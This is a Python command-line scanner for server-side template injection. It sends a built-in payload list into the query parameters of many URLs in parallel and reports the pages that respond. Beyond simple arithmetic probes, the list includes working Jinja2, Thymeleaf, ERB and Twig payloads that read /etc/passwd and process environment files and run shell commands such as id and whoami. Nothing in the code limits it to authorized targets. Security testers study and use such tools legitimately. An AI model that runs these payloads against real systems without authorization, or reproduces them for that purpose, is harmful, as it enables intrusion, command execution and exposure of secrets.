#!/usr/bin/env python3

import argparse
import requests
import threading
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, unquote
from colorama import Fore, Style, init
import concurrent.futures
import urllib3
import re
import sys
import logging

# Initialize colorama for colored output
init(autoreset=True)

# Suppress SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configure logging
logging.basicConfig(
    filename='ssti_scanner.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# Lock for thread-safe print and file operations
print_lock = threading.Lock()
file_lock = threading.Lock()

# Payloads with their expected response indicators (using regular expressions)
payloads = [
    # Simple arithmetic expressions to test evaluation
    {"payload": "{{7*7}}", "regex": r"49"},
    {"payload": "${7*7}", "regex": r"49"},
    {"payload": "#{7*7}", "regex": r"49"},
    {"payload": "<%=7*7%>", "regex": r"49"},
    {"payload": "${{7*7}}", "regex": r"49"},
    # String concatenation
    {"payload": "{{'a'+'b'}}", "regex": r"ab"},
    {"payload": "${'a'+'b'}", "regex": r"ab"},
    {"payload": "#{'a'+'b'}", "regex": r"ab"},
    {"payload": "<%='a'+'b'%>", "regex": r"ab"},
    # Length of a string
    {"payload": "{{'ab'|length}}", "regex": r"2"},
    {"payload": "${'ab'.length()}", "regex": r"2"},
    {"payload": "#{'ab'.length()}", "regex": r"2"},
    # Testing built-in variables
    {"payload": "{{config.debug}}", "regex": r"True|False"},
    {"payload": "{{request.method}}", "regex": r"GET|POST"},
    {"payload": "${request.method}", "regex": r"GET|POST"},
    # Encoded payloads
    {"payload": "%7B%7B7*7%7D%7D", "regex": r"49"},  # Encoded {{7*7}}
    {"payload": "%24%7B7*7%7D", "regex": r"49"},     # Encoded ${7*7}
    # Malformed payloads to bypass filters
    {"payload": "{{7*'7'}}", "regex": r"7777777"},
    {"payload": "{{7*7.0}}", "regex": r"49\.0"},
    {"payload": "{%7B7*7%7D}", "regex": r"49"},      # Encoded with braces
    # Testing for error messages
    {"payload": "{{", "regex": r"TemplateSyntaxError|Exception|Error"},
    {"payload": "{%", "regex": r"TemplateSyntaxError|Exception|Error"},
    # Checking for variable handling
    {"payload": "{{123}}", "regex": r"123"},
    {"payload": "${123}", "regex": r"123"},
    {"payload": "#{123}", "regex": r"123"},
    # Advanced payloads for file reading and command execution
    # File Access
    {"payload": "{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}", "regex": r"root:x:0:0:"},
    {"payload": "{{ ''.__class__.__mro__[1].__subclasses__()[40]('C:\\\\Windows\\\\win.ini').read() }}", "regex": r"\[fonts\]"},
    {"payload": "{{ ''.__class__.__mro__[1].__subclasses__()[40]('/proc/self/environ').read() }}", "regex": r"PATH="},
    # Command Execution
    {"payload": "{{ ''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['os'].popen('id').read() }}", "regex": r"uid=\d+"},
    {"payload": "{{ ''.__class__.__mro__[1].__subclasses__()[59]('id',shell=True,stdout=-1).communicate()[0].decode() }}", "regex": r"uid=\d+"},
    {"payload": "{{ ''.__class__.__mro__[1].__subclasses__()[59]('whoami',shell=True,stdout=-1).communicate()[0].decode() }}", "regex": r"\w+"},
    # Engine-Specific Payloads
    # Jinja2 (Python)
    {"payload": "{{ self.__init__.__globals__.__builtins__.open('/etc/passwd').read() }}", "regex": r"root:x:0:0:"},
    {"payload": "{{ config.from_pyfile('/etc/passwd') }}", "regex": r"root:x:0:0:"},
    # Thymeleaf (Java)
    {"payload": "${T(java.lang.Runtime).getRuntime().exec('id')}", "regex": r"uid=\d+"},
    {"payload": "${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}", "regex": r"root:x:0:0:"},
    # ERB (Ruby)
    {"payload": "<%= `id` %>", "regex": r"uid=\d+"},
    {"payload": "<%= File.open('/etc/passwd').read %>", "regex": r"root:x:0:0:"},
    # Twig (PHP)
    {"payload": "{{ system('id') }}", "regex": r"uid=\d+"},
    {"payload": "{{ include('/etc/passwd') }}", "regex": r"root:x:0:0:"},
    # Additional Complex Payloads
    {"payload": "{{''.class.mro[1].subclasses()[396]('id').read()}}", "regex": r"uid=\d+"},
    {"payload": "{{''.class.mro[1].subclasses()[396]('cat /etc/passwd').read()}}", "regex": r"root:x:0:0:"},
    # Null byte injection
    {"payload": "{{7*7}}\x00", "regex": r"49"},
]

def parse_arguments():
    """
    Parse command-line arguments.
    """
    parser = argparse.ArgumentParser(description="Automated SSTI Vulnerability Scanner.")
    parser.add_argument("-i", "--input", required=True, help="Input file with URLs")
    parser.add_argument("-o", "--output", required=True, help="Output file for vulnerable URLs")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads (default: 10)")
    parser.add_argument("-v", "--verbose", action='store_true', help="Enable verbose output")
    parser.add_argument("--timeout", type=int, default=15, help="Request timeout in seconds (default: 15)")
    return parser.parse_args()

def load_urls(file_path):
    """
    Load URLs from the input file.
    """
    try:
        with open(file_path, "r") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{Fore.RED}Error: Input file '{file_path}' not found.")
        sys.exit(1)

def inject_payload(url, param, payload, timeout):
    """
    Inject payload into the URL parameter and send the request.
    """
    try:
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        # Replace the parameter with the payload
        params[param] = payload
        new_query = urlencode(params, doseq=True)
        injected_url = urlunparse(parsed_url._replace(query=new_query))
        response = requests.get(injected_url, timeout=timeout, verify=False, allow_redirects=True)
        return response.text, injected_url
    except requests.exceptions.RequestException as e:
        logging.error(f"Error requesting {url}: {e}")
        return "", None

def analyze_response(response_text, regexes):
    """
    Analyze the response text for the given regex patterns.
    """
    for regex in regexes:
        pattern = re.compile(regex, re.IGNORECASE)
        if pattern.search(response_text):
            # Extract context around the match
            match = pattern.search(response_text)
            context_size = 40
            start = max(match.start() - context_size, 0)
            end = min(match.end() + context_size, len(response_text))
            context = response_text[start:end]
            return True, context
    return False, ""

def test_url(url, timeout, verbose):
    """
    Test a single URL for SSTI vulnerabilities.
    """
    parsed_url = urlparse(url)
    params = parse_qs(parsed_url.query)
    if not params:
        with print_lock:
            print(f"{Fore.YELLOW}No parameters found in URL: {url}")
        return None

    for param in params:
        for payload_entry in payloads:
            payload = payload_entry["payload"]
            regexes = [payload_entry["regex"]]
            decoded_payload = unquote(payload)

            response_text, injected_url = inject_payload(url, param, payload, timeout)
            if not response_text:
                continue  # Skip if no response was received

            detected, context = analyze_response(response_text, regexes)
            if detected:
                with print_lock:
                    print(f"{Fore.GREEN}[VULNERABLE] {url}")
                    print(f"Parameter: {param}")
                    print(f"Payload: {decoded_payload}")
                    print(f"Injected URL: {injected_url}")
                    if verbose:
                        print(f"Context: ...{context}...")
                    print("-" * 80)
                return url  # Stop after first vulnerability detected
        # If no payloads triggered a response, continue to next parameter
    with print_lock:
        print(f"{Fore.RED}[NOT VULNERABLE] {url}")
    return None

def main():
    """
    Main function to orchestrate the scanning.
    """
    args = parse_arguments()
    urls = load_urls(args.input)
    vulnerable_urls = []

    if not urls:
        print(f"{Fore.RED}Error: No URLs found in the input file.")
        sys.exit(1)

    print(f"{Fore.CYAN}Starting SSTI testing with {len(urls)} URLs using {args.threads} threads...\n")

    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
        future_to_url = {
            executor.submit(test_url, url, args.timeout, args.verbose): url
            for url in urls
        }
        for future in concurrent.futures.as_completed(future_to_url):
            result = future.result()
            if result:
                vulnerable_urls.append(result)

    # Write vulnerable URLs to output file
    if vulnerable_urls:
        try:
            with file_lock:
                with open(args.output, "w") as f:
                    for vuln_url in vulnerable_urls:
                        f.write(f"{vuln_url}\n")
            print(f"\n{Fore.CYAN}Vulnerable URLs have been saved to '{args.output}'")
        except Exception as e:
            print(f"{Fore.RED}Error writing to output file '{args.output}': {e}")
    else:
        print(f"\n{Fore.CYAN}No vulnerable URLs found.")

if __name__ == "__main__":
    main()
